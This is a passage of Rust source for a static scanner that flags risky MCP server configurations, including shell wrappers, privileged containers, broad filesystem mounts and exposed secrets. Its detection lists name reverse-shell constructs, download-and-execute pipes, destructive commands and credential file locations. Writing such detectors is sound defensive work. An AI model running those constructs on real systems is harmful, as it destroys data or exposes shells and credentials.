//! Static analysis rules for MCP server configurations.
//!
//! Nothing in this module executes commands, touches the network or reads files
//! referenced by a configuration. Every check is a pattern match on the
//! configuration text, so results are *indicators* to review, not proof of a
//! vulnerability. Secret values are never copied into findings.

use crate::config::{McpConfig, ServerConfig};
use serde_json::Value;
use std::collections::HashSet;

#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord, Hash)]
pub enum Severity {
    Info,
    Low,
    Medium,
    High,
}

impl Severity {
    pub fn label(self) -> &'static str {
        match self {
            Severity::Info => "INFO",
            Severity::Low => "LOW",
            Severity::Medium => "MEDIUM",
            Severity::High => "HIGH",
        }
    }

    fn lowered(self) -> Severity {
        match self {
            Severity::High => Severity::Medium,
            Severity::Medium => Severity::Low,
            Severity::Low | Severity::Info => Severity::Info,
        }
    }
}

/// How a finding was derived.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Confidence {
    /// A fact that is directly visible in the configuration.
    Observed,
    /// A pattern match that may be a false positive.
    Heuristic,
}

impl Confidence {
    pub fn label(self) -> &'static str {
        match self {
            Confidence::Observed => "observed in the configuration",
            Confidence::Heuristic => "heuristic pattern match (not verified)",
        }
    }
}

#[derive(Debug, Clone)]
pub struct Finding {
    pub rule: &'static str,
    pub severity: Severity,
    pub confidence: Confidence,
    pub server: String,
    pub field: String,
    pub title: String,
    pub why: String,
    pub fix: String,
}

impl Finding {
    fn new(
        rule: &'static str,
        severity: Severity,
        confidence: Confidence,
        server: &ServerConfig,
        field: String,
    ) -> Self {
        Finding {
            rule,
            severity,
            confidence,
            server: server.name.clone(),
            field,
            title: String::new(),
            why: String::new(),
            fix: String::new(),
        }
    }

    fn describe(mut self, title: &str, why: &str, fix: &str) -> Self {
        self.title = title.to_string();
        self.why = why.to_string();
        self.fix = fix.to_string();
        self
    }
}

/// Runs every rule against every server. Findings are sorted by severity
/// (highest first), then server and field.
pub fn scan(config: &McpConfig) -> Vec<Finding> {
    let mut findings = Vec::new();
    for server in &config.servers {
        let mut local = Vec::new();
        check_config_issues(server, &mut local);
        check_shell(server, &mut local);
        check_dangerous_patterns(server, &mut local);
        check_package_runner(server, &mut local);
        check_container(server, &mut local);
        check_filesystem(server, &mut local);
        check_secrets(server, &mut local);
        check_network(server, &mut local);
        check_environment(server, &mut local);
        check_auto_approval(server, &mut local);

        let mut seen: HashSet<(String, &'static str)> = HashSet::new();
        local.retain(|f| seen.insert((f.field.clone(), f.rule)));
        findings.extend(local);
    }
    findings.sort_by(|a, b| {
        b.severity
            .cmp(&a.severity)
            .then_with(|| a.server.cmp(&b.server))
            .then_with(|| a.field.cmp(&b.field))
            .then_with(|| a.rule.cmp(&b.rule))
    });
    findings
}

// ---------------------------------------------------------------------------
// Structure
// ---------------------------------------------------------------------------

fn check_config_issues(s: &ServerConfig, out: &mut Vec<Finding>) {
    for issue in &s.issues {
        out.push(
            Finding::new(
                "MW-CFG-001",
                Severity::Low,
                Confidence::Observed,
                s,
                issue.field.clone(),
            )
            .describe(
                &format!("Malformed or missing field: {}", issue.message),
                "Clients may ignore, reject or interpret this entry differently from what the file suggests, so the effective behavior of the server can differ from what you review here.",
                "Correct the field so it matches the structure your MCP client documents.",
            ),
        );
    }
}

// ---------------------------------------------------------------------------
// Shell execution
// ---------------------------------------------------------------------------

const SHELLS: &[&str] = &[
    "sh",
    "bash",
    "zsh",
    "fish",
    "dash",
    "ksh",
    "csh",
    "tcsh",
    "ash",
    "cmd",
    "powershell",
    "pwsh",
];

fn basename(command: &str) -> String {
    let normalized = command.trim().replace('\\', "/");
    let base = normalized
        .rsplit('/')
        .next()
        .unwrap_or("")
        .to_ascii_lowercase();
    for ext in [".exe", ".cmd", ".bat", ".ps1"] {
        if let Some(stem) = base.strip_suffix(ext) {
            return stem.to_string();
        }
    }
    base
}

fn is_inline_flag(arg: &str) -> bool {
    let a = arg.to_ascii_lowercase();
    if matches!(
        a.as_str(),
        "-c" | "/c" | "/k" | "/r" | "-command" | "-encodedcommand" | "-enc" | "-ec"
    ) {
        return true;
    }
    a.len() >= 3
        && a.len() <= 5
        && a.starts_with('-')
        && !a.starts_with("--")
        && a.ends_with('c')
        && a[1..].chars().all(|c| c.is_ascii_alphabetic())
}

fn has_shell_operators(payload: &str) -> bool {
    payload
        .chars()
        .any(|c| matches!(c, '&' | ';' | '|' | '`' | '>' | '<'))
        || payload.contains("$(")
}

fn check_shell(s: &ServerConfig, out: &mut Vec<Finding>) {
    let Some(command) = s.command.as_deref() else {
        return;
    };
    if !SHELLS.contains(&basename(command).as_str()) {
        return;
    }
    match s.args.iter().position(|a| is_inline_flag(a)) {
        None => out.push(
            Finding::new(
                "MW-SHELL-001",
                Severity::Low,
                Confidence::Observed,
                s,
                s.command_path.clone(),
            )
            .describe(
                "Server is launched through a shell interpreter",
                "A shell interprets its arguments and expands variables, which adds a layer between the configuration and what actually runs. No inline command was found, so this may be a harmless wrapper.",
                "Prefer naming the server executable directly in `command` and passing options through `args`.",
            ),
        ),
        Some(i) => {
            let payload_index = if i + 1 < s.args.len() { i + 1 } else { i };
            let payload = s.args[i + 1..].join(" ");
            let field = format!("{}[{}]", s.args_path, payload_index);
            if has_shell_operators(&payload) {
                out.push(
                    Finding::new("MW-SHELL-001", Severity::Medium, Confidence::Heuristic, s, field)
                        .describe(
                            "Inline shell command with chained or redirected operations",
                            "The whole string is parsed as shell syntax, so what runs is harder to audit from the configuration alone and any value expanded into it is interpreted as shell code.",
                            "Move the logic into a reviewed script, or invoke the server executable directly with discrete `args`.",
                        ),
                );
            } else {
                out.push(
                    Finding::new("MW-SHELL-001", Severity::Low, Confidence::Observed, s, field)
                        .describe(
                            "Server is launched through a shell with an inline command",
                            "Wrappers such as `cmd /c npx ...` are common, particularly on Windows, but they add shell interpretation of the command string. No chaining or redirection was detected in this one.",
                            "If the wrapper is not required by your client, call the executable directly.",
                        ),
                );
            }
        }
    }
}

fn has_token(text: &str, token: &str) -> bool {
    text.split(|c: char| !(c.is_ascii_alphanumeric() || c == '-' || c == '_'))
        .any(|t| t == token)
}

fn pipes_to_interpreter(text: &str) -> bool {
    text.split('|').skip(1).any(|segment| {
        let first = segment
            .trim_start()
            .split(|c: char| c.is_whitespace() || matches!(c, ';' | '&' | ')'))
            .next()
            .unwrap_or("");
        matches!(
            first,
            "sh" | "bash"
                | "zsh"
                | "dash"
                | "ksh"
                | "sudo"
                | "python"
                | "python3"
                | "node"
                | "perl"
                | "ruby"
                | "iex"
                | "invoke-expression"
        )
    })
}

fn check_dangerous_patterns(s: &ServerConfig, out: &mut Vec<Finding>) {
    let mut parts: Vec<&str> = Vec::new();
    if let Some(c) = s.command.as_deref() {
        parts.push(c);
    }
    parts.extend(s.args.iter().map(String::as_str));
    if parts.is_empty() {
        return;
    }
    let joined = parts.join(" ").to_ascii_lowercase();

    let locate = |needle: &str| -> String {
        if let Some(i) = s
            .args
            .iter()
            .position(|a| a.to_ascii_lowercase().contains(needle))
        {
            return format!("{}[{}]", s.args_path, i);
        }
        if s.command
            .as_deref()
            .is_some_and(|c| c.to_ascii_lowercase().contains(needle))
        {
            return s.command_path.clone();
        }
        s.args_path.clone()
    };

    // Download-and-execute.
    let downloader = [
        "curl ",
        "wget ",
        "invoke-webrequest",
        "invoke-restmethod",
        "iwr ",
        "irm ",
    ]
    .into_iter()
    .find(|d| joined.contains(*d));
    let ps_cradle = (has_token(&joined, "iex") || joined.contains("invoke-expression"))
        && ["downloadstring", "net.webclient", "iwr ", "invoke-webrequest"]
            .iter()
            .any(|p| joined.contains(*p));
    if (downloader.is_some() && pipes_to_interpreter(&joined)) || ps_cradle {
        let needle = downloader.map(str::trim).unwrap_or("iex");
        out.push(
            Finding::new(
                "MW-SHELL-002",
                Severity::High,
                Confidence::Heuristic,
                s,
                locate(needle),
            )
            .describe(
                "Downloads remote content and executes it",
                "What runs depends on whatever the remote host serves at launch time, so it cannot be reviewed beforehand and can change without any edit to this file.",
                "Install a reviewed, version-pinned package or binary instead of piping downloaded content into an interpreter.",
            ),
        );
    }

    // Reverse-shell style constructs.
    if let Some(needle) = ["/dev/tcp/", "nc -e", "ncat -e", "netcat -e", "bash -i >&"]
        .into_iter()
        .find(|n| joined.contains(*n))
    {
        out.push(
            Finding::new(
                "MW-SHELL-003",
                Severity::High,
                Confidence::Heuristic,
                s,
                locate(needle),
            )
            .describe(
                "Pattern resembling a reverse shell",
                "These constructs are commonly used to hand an interactive shell to a remote host. They can also appear in legitimate network tooling, so review the full command.",
                "Remove the construct, or confirm that you wrote it and understand exactly where it connects.",
            ),
        );
    }

    // Destructive commands.
    if let Some(needle) = [
        "rm -rf", "rm -fr", "mkfs", "dd if=", "rmdir /s", "del /s", "format c:",
    ]
    .into_iter()
    .find(|n| joined.contains(*n))
    {
        out.push(
            Finding::new(
                "MW-SHELL-004",
                Severity::Medium,
                Confidence::Heuristic,
                s,
                locate(needle),
            )
            .describe(
                "Command that can delete files or overwrite disks",
                "A server launcher rarely needs destructive file operations. This may be intentional cleanup, but a mistake or a manipulated path could remove data.",
                "Remove the destructive command from the launcher, or scope it to a dedicated temporary directory.",
            ),
        );
    }

    // Encoded or obfuscated payloads.
    let obfuscation_field = ["base64 -d", "base64 --decode", "frombase64string"]
        .into_iter()
        .find(|n| joined.contains(*n))
        .map(|n| locate(n))
        .or_else(|| {
            s.args
                .iter()
                .position(|a| {
                    matches!(
                        a.to_ascii_lowercase().as_str(),
                        "-encodedcommand" | "-enc" | "-ec"
                    )
                })
                .map(|i| format!("{}[{}]", s.args_path, i))
        });
    if let Some(field) = obfuscation_field {
        out.push(
            Finding::new("MW-SHELL-005", Severity::Medium, Confidence::Heuristic, s, field)
                .describe(
                    "Encoded or obfuscated command",
                    "Encoded payloads hide what will run from anyone reviewing the configuration. They have legitimate uses but are also a common way to conceal malicious commands.",
                    "Replace the encoded payload with a readable command or a reviewed script.",
                ),
        );
    }

    // Privilege elevation.
    let command_is_elevator = s.command.as_deref().is_some_and(|c| {
        matches!(
            basename(c).as_str(),
            "sudo" | "doas" | "runas" | "pkexec"
        )
    });
    if command_is_elevator || has_token(&joined, "sudo") {
        let field = if command_is_elevator {
            s.command_path.clone()
        } else {
            locate("sudo")
        };
        out.push(
            Finding::new("MW-SHELL-006", Severity::Medium, Confidence::Heuristic, s, field)
                .describe(
                    "Requests elevated privileges",
                    "A server started with elevated privileges can read or change files that your normal user account cannot.",
                    "Run the server as your regular user, or grant only the specific access it needs.",
                ),
        );
    }
}

// ---------------------------------------------------------------------------
// Package runners (npx, uvx, ...)
// ---------------------------------------------------------------------------

const RUNNER_VALUE_FLAGS: &[&str] = &[
    "--registry",
    "--prefix",
    "--cache",
    "--python",
    "-w",
    "--with",
    "--index-url",
    "--extra-index-url",
    "--index",
    "--default-index",
];

fn find_package_spec(args: &[String], start: usize, pypi: bool) -> Option<(usize, String)> {
    let mut i = start;
    while i < args.len() {
        let a = args[i].as_str();
        if matches!(a, "--package" | "--from") || (!pypi && a == "-p") {
            return args.get(i + 1).map(|v| (i + 1, v.clone()));
        }
        for prefix in ["--package=", "--from="] {
            if let Some(v) = a.strip_prefix(prefix) {
                return Some((i, v.to_string()));
            }
        }
        if a.starts_with('-') {
            if RUNNER_VALUE_FLAGS.contains(&a) || (pypi && a == "-p") {
                i += 2;
            } else {
                i += 1;
            }
            continue;
        }
        return Some((i, a.to_string()));
    }
    None
}

fn is_local_spec(spec: &str) -> bool {
    let lower = spec.to_ascii_lowercase();
    spec.starts_with('.')
        || spec.starts_with('/')
        || spec.starts_with('~')
        || spec.contains('\\')
        || has_drive_prefix(spec)
        || lower.starts_with("file:")
        || [".js", ".mjs", ".cjs", ".py", ".tgz", ".whl"]
            .iter()
            .any(|e| lower.ends_with(*e))
}

fn is_remote_source(spec: &str) -> bool {
    spec.contains("://")
        || ["git+", "github:", "gitlab:", "bitbucket:"]
            .iter()
            .any(|p| spec.starts_with(*p))
}

fn is_pinned_git(spec: &str) -> bool {
    spec.rsplit_once('#')
        .is_some_and(|(_, r)| r.len() == 40 && r.chars().all(|c| c.is_ascii_hexdigit()))
}

/// Splits `name@version`, `@scope/name@version` or `name==version`.
fn split_spec(spec: &str) -> (&str, Option<&str>) {
    if let Some(pos) = spec.find("==") {
        return (&spec[..pos], Some(&spec[pos + 2..]));
    }
    let start = usize::from(spec.starts_with('@'));
    match spec[start..].find('@') {
        Some(p) => (&spec[..start + p], Some(&spec[start + p + 1..])),
        None => (spec, None),
    }
}

fn is_exact_version(version: &str) -> bool {
    let v = version.trim();
    let mut chars = v.chars();
    match chars.next() {
        Some(c) if c.is_ascii_digit() => true,
        Some('v') => chars.next().is_some_and(|c| c.is_ascii_digit()),
        _ => false,
    }
}

fn check_package_runner(s: &ServerConfig, out: &mut Vec<Finding>) {
    let Some(command) = s.command.as_deref() else {
        return;
    };
    let first = s.args.first().map(String::as_str);
    let (start, pypi) = match basename(command).as_str() {
        "npx" | "bunx" | "pnpx" => (0, false),
        "uvx" => (0, true),
        "npm" | "pnpm" | "yarn" | "bun" => match first {
            Some("exec") | Some("dlx") | Some("x") => (1, false),
            _ => return,
        },
        "pipx" => match first {
            Some("run") => (1, true),
            _ => return,
        },
        _ => return,
    };
    let Some((idx, spec)) = find_package_spec(&s.args, start, pypi) else {
        return;
    };
    if is_local_spec(&spec) {
        return;
    }
    let field = format!("{}[{}]", s.args_path, idx);

    if is_remote_source(&spec) {
        if !is_pinned_git(&spec) {
            out.push(
                Finding::new("MW-PKG-002", Severity::Medium, Confidence::Observed, s, field)
                    .describe(
                        "Package is fetched from a URL or git reference at launch",
                        "Code is downloaded from a location outside the package registry each time the server starts, and a branch or tag can move to different code without any change to this file.",
                        "Prefer a published, version-pinned package, or pin the source to an immutable commit hash.",
                    ),
            );
        }
        return;
    }

    let (_, version) = split_spec(&spec);
    if !version.is_some_and(is_exact_version) {
        out.push(
            Finding::new("MW-PKG-001", Severity::Low, Confidence::Observed, s, field).describe(
                "Package is fetched and run without an exact version pin",
                "Without an exact version, a later launch may resolve a different release, so a changed or compromised release would run with the permissions of your MCP client. Pinning does not make a package trustworthy, but it makes updates deliberate.",
                "Pin an exact version, for example `package@1.2.3`, and review updates before changing it.",
            ),
        );
    }
}

// ---------------------------------------------------------------------------
// Containers
// ---------------------------------------------------------------------------

fn is_container_runtime(s: &ServerConfig) -> bool {
    s.command
        .as_deref()
        .is_some_and(|c| matches!(basename(c).as_str(), "docker" | "podman" | "nerdctl"))
}

fn check_container(s: &ServerConfig, out: &mut Vec<Finding>) {
    if !is_container_runtime(s) {
        return;
    }
    let Some(run_at) = s.args.iter().position(|a| a == "run") else {
        return;
    };
    for i in (run_at + 1)..s.args.len() {
        let field = |idx: usize| format!("{}[{}]", s.args_path, idx);

        if s.args[i] == "--privileged" {
            out.push(
                Finding::new("MW-CONT-001", Severity::High, Confidence::Observed, s, field(i))
                    .describe(
                        "Container runs in privileged mode",
                        "A privileged container is granted nearly all host capabilities and device access, which weakens the isolation a container would otherwise provide.",
                        "Remove `--privileged`; grant only the specific capabilities or devices the server needs.",
                    ),
            );
            continue;
        }

        for (flag, namespace) in [
            ("--network", "network"),
            ("--net", "network"),
            ("--pid", "process"),
            ("--ipc", "IPC"),
        ] {
            if let Some((value, idx)) = flag_value(&s.args, i, &[flag]) {
                if value == "host" {
                    out.push(
                        Finding::new(
                            "MW-CONT-002",
                            Severity::Medium,
                            Confidence::Observed,
                            s,
                            field(idx),
                        )
                        .describe(
                            &format!("Container shares the host {namespace} namespace"),
                            "Sharing a host namespace removes part of the isolation between the container and the host system.",
                            "Use the default isolated namespace and publish only the ports you need.",
                        ),
                    );
                }
            }
        }

        if let Some((value, idx)) = flag_value(&s.args, i, &["--cap-add"]) {
            let cap = value.to_ascii_uppercase();
            if matches!(cap.as_str(), "ALL" | "SYS_ADMIN" | "SYS_PTRACE" | "SYS_MODULE") {
                out.push(
                    Finding::new("MW-CONT-003", Severity::High, Confidence::Observed, s, field(idx))
                        .describe(
                            &format!("Container is granted a powerful capability (`{cap}`)"),
                            "Capabilities such as SYS_ADMIN or ALL substantially widen what code inside the container can do to the host.",
                            "Remove `--cap-add`, or request the narrowest capability that works.",
                        ),
                );
            }
        }

        if let Some((value, idx)) = flag_value(&s.args, i, &["--security-opt"]) {
            if value.to_ascii_lowercase().contains("unconfined") {
                out.push(
                    Finding::new(
                        "MW-CONT-004",
                        Severity::Medium,
                        Confidence::Observed,
                        s,
                        field(idx),
                    )
                    .describe(
                        "Container security profile is disabled",
                        "An unconfined seccomp or AppArmor profile removes a default layer of syscall and access restriction.",
                        "Use the default profile, or a custom profile that is more restrictive.",
                    ),
                );
            }
        }
    }
}

// ---------------------------------------------------------------------------
// Filesystem access
// ---------------------------------------------------------------------------

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum PathRisk {
    Root,
    UserHomes,
    Home,
    Credentials,
    ContainerSocket,
    SystemSensitive,
    SystemBroad,
    ParentTraversal,
}

const CREDENTIAL_COMPONENTS: &[&str] = &[
    ".ssh",
    ".aws",
    ".gnupg",
    ".kube",
    ".azure",
    ".docker",
    ".netrc",
    ".npmrc",
    ".pypirc",
    ".pgpass",
    ".git-credentials",
    "id_rsa",
    "id_ed25519",
    "keychains",
];
const SENSITIVE_SYSTEM_PREFIXES: &[&str] =
    &["/etc", "/root", "/proc", "/sys", "/dev", "/boot", "/private/etc"];
const BROAD_SYSTEM_DIRS: &[&str] = &[
    "/var",
    "/usr",
    "/bin",
    "/sbin",
    "/lib",
    "/opt",
    "/mnt",
    "/media",
    "/library",
    "/applications",
    "/system",
    "/volumes",
    "/private",
];

fn has_drive_prefix(text: &str) -> bool {
    let b = text.as_bytes();
    b.len() >= 2
        && b[0].is_ascii_alphabetic()
        && b[1] == b':'
        && (b.len() == 2 || b[2] == b'/' || b[2] == b'\\')
}

fn is_drive(component: &str) -> bool {
    let b = component.as_bytes();
    b.len() == 2 && b[0].is_ascii_alphabetic() && b[1] == b':'
}

fn looks_like_path(value: &str) -> bool {
    let t = value.trim();
    if t.is_empty() || t.contains("://") {
        return false;
    }
    let l = t.to_ascii_lowercase();
    t.starts_with('/')
        || t.starts_with('~')
        || t.starts_with("\\\\")
        || t == ".."
        || t.starts_with("../")
        || t.starts_with("..\\")
        || l.starts_with("$home")
        || l.starts_with("${home}")
        || l.starts_with("%userprofile%")
        || l.starts_with("$userprofile")
        || l.starts_with("$env:userprofile")
        || l.starts_with("%homepath%")
        || has_drive_prefix(t)
}

fn normalize_path(raw: &str) -> String {
    let mut p = raw.trim().replace('\\', "/").to_ascii_lowercase();
    loop {
        if let Some(rest) = p.strip_suffix("/**") {
            p = rest.to_string();
        } else if let Some(rest) = p.strip_suffix("/*") {
            p = rest.to_string();
        } else {
            break;
        }
    }
    while p.len() > 1 && p.ends_with('/') {
        p.pop();
    }
    for marker in [
        "${home}",
        "$home",
        "%userprofile%",
        "$userprofile",
        "$env:userprofile",
        "%homepath%",
    ] {
        if let Some(rest) = p.strip_prefix(marker) {
            p = format!("~{rest}");
            break;
        }
    }
    p
}

fn classify_path(raw: &str) -> Option<PathRisk> {
    let p = normalize_path(raw);
    if p.is_empty() || p == "/" || is_drive(&p) {
        return Some(PathRisk::Root);
    }
    if p == "~" {
        return Some(PathRisk::Home);
    }
    if p == "/dev/null" {
        return None;
    }
    if p.ends_with("docker.sock") || p.ends_with("podman.sock") || p.contains("pipe/docker_engine")
    {
        return Some(PathRisk::ContainerSocket);
    }
    let comps: Vec<&str> = p.split('/').filter(|c| !c.is_empty()).collect();
    if comps.iter().any(|c| CREDENTIAL_COMPONENTS.contains(c)) || p.contains(".config/gcloud") {
        return Some(PathRisk::Credentials);
    }
    let absolute = p.starts_with('/');
    let drive = comps.first().is_some_and(|c| is_drive(c));
    if absolute && comps.len() == 1 && (comps[0] == "home" || comps[0] == "users") {
        return Some(PathRisk::UserHomes);
    }
    if drive && comps.len() == 2 && comps[1] == "users" {
        return Some(PathRisk::UserHomes);
    }
    if absolute && comps.len() == 2 && (comps[0] == "home" || comps[0] == "users") {
        return Some(PathRisk::Home);
    }
    if drive && comps.len() == 3 && comps[1] == "users" {
        return Some(PathRisk::Home);
    }
    for prefix in SENSITIVE_SYSTEM_PREFIXES {
        if p == *prefix || p.starts_with(&format!("{prefix}/")) {
            return Some(PathRisk::SystemSensitive);
        }
    }
    if drive && comps.len() >= 2 && comps[1] == "windows" {
        return Some(PathRisk::SystemSensitive);
    }
    if drive
        && comps.len() == 2
        && matches!(comps[1], "program files" | "program files (x86)" | "programdata")
    {
        return Some(PathRisk::SystemBroad);
    }
    if BROAD_SYSTEM_DIRS.contains(&p.as_str()) {
        return Some(PathRisk::SystemBroad);
    }
    if p == ".." || p.starts_with("../") {
        return Some(PathRisk::ParentTraversal);
    }
    None
}

fn path_finding(
    s: &ServerConfig,
    field: String,
    raw: &str,
    risk: PathRisk,
    readonly: bool,
    out: &mut Vec<Finding>,
) {
    let (severity, rule, title, why, fix): (Severity, &'static str, String, &str, &str) = match risk
    {
        PathRisk::Root => (
            Severity::High,
            "MW-FS-001",
            format!("Access to the filesystem root (`{raw}`)"),
            "A server given the root directory may be able to read, and depending on its tools modify, any file the current user account can access, including credentials and unrelated projects. MCPWatch cannot see which operations the server actually permits.",
            "Limit access to the specific project directory the agent needs, for example `/path/to/project`.",
        ),
        PathRisk::UserHomes => (
            Severity::High,
            "MW-FS-002",
            format!("Access to all user home directories (`{raw}`)"),
            "The directory that holds every user's home folder includes other accounts' keys, documents and application data.",
            "Point the server at one project directory instead.",
        ),
        PathRisk::Home => (
            Severity::Medium,
            "MW-FS-003",
            format!("Access to an entire home directory (`{raw}`)"),
            "Home directories commonly contain SSH keys, cloud credentials, browser data and personal documents next to project files.",
            "Grant access to the specific project directory rather than the whole home directory.",
        ),
        PathRisk::Credentials => (
            Severity::High,
            "MW-FS-004",
            format!("Access to a credential or key location (`{raw}`)"),
            "This path matches a location where credentials, private keys or authentication tokens are commonly stored.",
            "Remove this path, or confirm the server genuinely needs it and cannot be given a narrower scope.",
        ),
        PathRisk::ContainerSocket => (
            Severity::High,
            "MW-FS-005",
            format!("Container runtime socket is exposed (`{raw}`)"),
            "Access to a container runtime socket generally allows starting containers with arbitrary host mounts, which is close to broad control of the host.",
            "Do not expose the socket to the server; use a purpose-built, restricted interface if container access is required.",
        ),
        PathRisk::SystemSensitive => (
            Severity::High,
            "MW-FS-006",
            format!("Access to a sensitive system location (`{raw}`)"),
            "System configuration and device directories can expose account data and host settings and are rarely needed by an MCP server.",
            "Remove the path or replace it with a project-specific directory.",
        ),
        PathRisk::SystemBroad => (
            Severity::Medium,
            "MW-FS-007",
            format!("Access to a broad system directory (`{raw}`)"),
            "Top-level system directories contain much more than a single project and widen what the server can reach.",
            "Use a narrower directory dedicated to the server's task.",
        ),
        PathRisk::ParentTraversal => (
            Severity::Low,
            "MW-FS-008",
            format!("Path climbs out of the working directory (`{raw}`)"),
            "Relative paths that start with `..` make the effective scope depend on where the client is launched from.",
            "Use an explicit, absolute project path.",
        ),
    };

    let (severity, why) = if readonly {
        (
            severity.lowered(),
            format!("{why} The mount is read-only, which limits modification but not disclosure of its contents."),
        )
    } else {
        (severity, why.to_string())
    };
    out.push(
        Finding::new(rule, severity, Confidence::Observed, s, field).describe(&title, &why, fix),
    );
}

/// Returns the value of `--flag value` or `--flag=value` at position `i`,
/// together with the index of the argument that holds the value.
fn flag_value<'a>(args: &'a [String], i: usize, flags: &[&str]) -> Option<(&'a str, usize)> {
    let arg = args[i].as_str();
    for flag in flags {
        if arg == *flag {
            return args.get(i + 1).map(|v| (v.as_str(), i + 1));
        }
        if let Some(rest) = arg.strip_prefix(*flag).and_then(|r| r.strip_prefix('=')) {
            return Some((rest, i));
        }
    }
    None
}

/// For `--flag=value` arguments returns the value, otherwise the argument.
fn arg_value(arg: &str) -> &str {
    if arg.starts_with('-') {
        arg.split_once('=').map_or(arg, |(_, v)| v)
    } else {
        arg
    }
}

fn docker_host_path(spec: &str) -> String {
    let skip = if has_drive_prefix(spec) && spec.len() > 2 { 2 } else { 0 };
    match spec[skip..].find(':') {
        Some(p) => spec[..skip + p].to_string(),
        None => spec.to_string(),
    }
}

fn docker_volume_is_readonly(spec: &str) -> bool {
    let l = spec.to_ascii_lowercase();
    l.ends_with(":ro") || l.contains(":ro,") || l.ends_with(":readonly")
}

fn docker_mount_source(spec: &str) -> Option<(String, bool)> {
    let mut source = None;
    let mut readonly = false;
    for part in spec.split(',') {
        match part.split_once('=') {
            Some((k, v)) => match k.trim() {
                "source" | "src" => source = Some(v.trim().to_string()),
                "readonly" | "ro" => readonly = !matches!(v.trim(), "false" | "0"),
                _ => {}
            },
            None => {
                if matches!(part.trim(), "readonly" | "ro") {
                    readonly = true;
                }
            }
        }
    }
    source.map(|s| (s, readonly))
}

fn check_filesystem(s: &ServerConfig, out: &mut Vec<Finding>) {
    let container = is_container_runtime(s);
    let mut consumed: HashSet<usize> = HashSet::new();

    for i in 0..s.args.len() {
        if consumed.contains(&i) {
            continue;
        }
        let mut candidate: Option<(String, usize, bool)> = None;

        if container {
            if let Some((spec, idx)) = flag_value(&s.args, i, &["-v", "--volume"]) {
                consumed.insert(idx);
                let host = docker_host_path(spec);
                if !looks_like_path(&host) {
                    continue;
                }
                candidate = Some((host, idx, docker_volume_is_readonly(spec)));
            } else if let Some((spec, idx)) = flag_value(&s.args, i, &["--mount"]) {
                consumed.insert(idx);
                match docker_mount_source(spec) {
                    Some((src, ro)) if looks_like_path(&src) => candidate = Some((src, idx, ro)),
                    _ => continue,
                }
            }
        }

        if candidate.is_none() {
            let value = arg_value(&s.args[i]);
            if looks_like_path(value) {
                candidate = Some((value.to_string(), i, false));
            }
        }

        if let Some((raw, idx, readonly)) = candidate {
            if let Some(risk) = classify_path(&raw) {
                path_finding(
                    s,
                    format!("{}[{}]", s.args_path, idx),
                    &raw,
                    risk,
                    readonly,
                    out,
                );
            }
        }
    }

    for (key, value) in &s.env {
        let upper = key.to_ascii_uppercase();
        let pathish = ["DIR", "ROOT", "FOLDER", "WORKSPACE", "VAULT", "ALLOWED"]
            .iter()
            .any(|w| upper.contains(*w));
        if pathish && looks_like_path(value) {
            if let Some(risk) = classify_path(value) {
                path_finding(
                    s,
                    format!("{}.{}", s.env_path, key),
                    value,
                    risk,
                    false,
                    out,
                );
            }
        }
    }
}

// ---------------------------------------------------------------------------
// Secrets
// ---------------------------------------------------------------------------

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub(crate) enum SecretKind {
    /// Matches the documented shape of a specific token type.
    Known(&'static str),
    /// A literal value stored under a credential-like name.
    Named,
}

#[derive(Debug, Clone, Copy)]
pub(crate) struct SecretArg {
    pub index: usize,
    pub kind: SecretKind,
    /// True when the argument holds only the value (the flag name is the
    /// previous argument).
    pub value_only: bool,
}

pub(crate) fn is_name_like(name: &str) -> bool {
    let t = name.trim();
    !t.is_empty()
        && t.len() <= 64
        && t.chars()
            .all(|c| c.is_ascii_alphanumeric() || matches!(c, '_' | '-' | '.'))
}

pub(crate) fn is_sensitive_name(name: &str) -> bool {
    let n = name
        .trim()
        .to_ascii_lowercase()
        .replace(|c: char| matches!(c, '-' | '.' | ' '), "_");
    if n.is_empty() || n.contains("public") {
        return false;
    }
    const EXCLUDED_SUFFIXES: &[&str] = &[
        "_file",
        "_path",
        "_dir",
        "_env",
        "_url",
        "_uri",
        "_limit",
        "_count",
        "_max",
        "_min",
        "_size",
        "_ttl",
        "_expiry",
        "_expires",
        "_timeout",
        "_type",
        "_length",
        "_name",
        "_id",
        "_endpoint",
        "tokens",
    ];
    if EXCLUDED_SUFFIXES.iter().any(|s| n.ends_with(*s)) {
        return false;
    }
    const WORDS: &[&str] = &[
        "token",
        "secret",
        "password",
        "passwd",
        "apikey",
        "api_key",
        "private_key",
        "privatekey",
        "access_key",
        "accesskey",
        "credential",
        "authorization",
        "bearer",
        "auth_key",
        "signing_key",
        "encryption_key",
    ];
    if WORDS.iter().any(|w| n.contains(*w)) {
        return true;
    }
    matches!(n.as_str(), "key" | "pwd" | "pass" | "sig" | "signature")
        || n.ends_with("_key")
        || n.ends_with("_pwd")
}

pub(crate) fn is_placeholder(value: &str) -> bool {
    let v = value.trim();
    if v.is_empty() {
        return true;
    }
    if v.contains("${") || v.contains("$(") || v.contains("{{") {
        return true;
    }
    if v.starts_with('$') || (v.len() > 2 && v.starts_with('%') && v.ends_with('%')) {
        return true;
    }
    if v.starts_with('<') && v.ends_with('>') {
        return true;
    }
    if v.chars()
        .all(|c| matches!(c, 'x' | 'X' | '*' | '.' | '-' | '_'))
    {
        return true;
    }
    let l = v.to_ascii_lowercase();
    if matches!(
        l.as_str(),
        "true" | "false" | "null" | "none" | "undefined" | "changeme" | "change-me" | "todo" | "tbd"
    ) {
        return true;
    }
    ["your", "example", "placeholder", "replace", "insert", "enter", "xxx"]
        .iter()
        .any(|p| l.starts_with(*p))
}

/// For `Bearer abc`-style values returns only the credential part.
fn secret_part(value: &str) -> &str {
    let v = value.trim();
    for prefix in ["bearer ", "basic ", "token ", "apikey "] {
        if let Some(head) = v.get(..prefix.len()) {
            if head.eq_ignore_ascii_case(prefix) {
                return v[prefix.len()..].trim();
            }
        }
    }
    v
}

fn looks_like_file_reference(value: &str) -> bool {
    if looks_like_path(value) {
        return true;
    }
    let l = value.to_ascii_lowercase();
    !value.contains(' ')
        && [".json", ".pem", ".key", ".p12", ".pfx", ".crt", ".txt", ".cert"]
            .iter()
            .any(|e| l.ends_with(*e))
}

fn known_token_kind(token: &str) -> Option<&'static str> {
    let t = token.trim_end_matches('.');
    let len = t.len();
    let tokenish = t
        .chars()
        .all(|c| c.is_ascii_alphanumeric() || c == '_' || c == '-');
    let bytes = t.as_bytes();

